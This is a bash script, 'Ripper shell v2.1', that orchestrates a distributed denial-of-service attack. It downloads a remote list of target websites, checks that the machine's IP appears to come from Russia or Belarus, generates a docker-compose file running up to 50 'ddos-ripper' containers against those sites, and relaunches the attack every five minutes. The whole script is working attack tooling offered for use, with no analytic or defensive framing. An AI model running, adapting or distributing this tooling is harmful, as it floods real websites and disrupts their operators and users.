#!/bin/bash
# Ripper shell v2.1
# 1.0 - initial script (uses local urls.txt file)
# 2.0 - added external mirror for url list
# 2.1 - added possibility to limit number of containers (for less powerful machines like 13in mbp pre M1)

VERSION='2.1'
TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
CHECK_VPN_API_URL='https://ipapi.com/ip_api.php?ip='

# https://ipapi.com/ip_api.php?ip=
# Used for country code check.
function check_vpn_status {
  ip=$(dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com)
  ip=`sed -e 's/^"//' -e 's/"$//' <<<"$ip"`
  code=$(curl --silent ${CHECK_VPN_API_URL}${ip} | python -c 'import json,sys;obj=json.load(sys.stdin);print obj["country_code"]')

  if [ "$code" != "RU" ] && [ "$code" != "BY" ]; then
    echo -e "Warning: Please use VPN country which are in this list: RU or BY"
    exit 1
  fi
}

function print_help {
  echo -e "Usage: bash ddos-mac.sh --mode install"
  echo -e "--mode|-m - runmode (install, reinstall, start, stop)"
  echo -e "--number|-n - number of containers to start"
}

function print_version {
  echo $VERSION
}

function check_dependencies {
  if $(docker -v | grep "Docker"); then
    echo "Please install docker first. https://www.docker.com/products/docker-desktop"
    exit 1
  fi
}

function check_params {
  if [ -z ${MODE+x} ]; then
    echo -e "Mode is unset, please specify correct runmode"
    exit 1
  fi
}

function generate_compose {
    if [ -z ${amount} ]; then
        echo -e "Amount of containers not set, setting to maximum of 50"
        amount=50
    fi

    echo -e "version: '3'" > docker-compose.yml
    echo -e "services:" >> docker-compose.yml
    numberOfSites=0

  for (( c=1; c<="$amount"; c++ )); do
    counter=$c
    while read -r site_url; do
        if [ $counter -le $amount ]; then
            if [ ! -z $site_url ]; then
                echo -e "  ddos-runner-$counter:" >> docker-compose.yml
                echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
                echo -e "    restart: always" >> docker-compose.yml
                echo -e "    command: $site_url" >> docker-compose.yml
                echo -e "    network_mode: bridge" >> docker-compose.yml
                ((counter++))
                ((c++))
                ((numberOfSites++))
            fi
        fi
    done < activeHosts.txt
  done

  if [ "$numberOfSites" == 0 ]; then
    echo -e "Restart VPN"
    exit 1
  fi
}

function updateDepend {
    git pull origin master
    docker pull nitupkcuf/ddos-ripper

    python3 script.py
}

function reinstall {
  updateDepend
  ripper_stop

  check_vpn_status
  generate_compose
  ripper_start
}

function ripper_start {
  echo "Starting ripper attack"
  docker-compose up -d

  sleep 300

  bash ddos-unix.sh -m reinstall -n $amount
}

function ripper_stop {
  echo "Stopping ripper attack"

  docker-compose down
  docker-compose rm -f
}

while test -n "$1"; do
  case "$1" in
  --help|-h)
    print_help
    exit
    ;;
  --mode|-m)
    MODE=$2
    shift
    ;;
  --number|-n)
      amount=$2
      shift
      ;;
  *)
    echo "Unknown argument: $1"
    print_help
    exit
    ;;
  esac
  shift
done


check_params

case $MODE in
  install)
    check_vpn_status
    updateDepend
    generate_compose
    ripper_start
    ;;
  start)
    check_vpn_status
    ripper_start
    ;;
  stop)
    ripper_stop
    ;;
  reinstall)
    reinstall
    ;;
  *)
    echo "Wrong mode"
    exit 1
esac
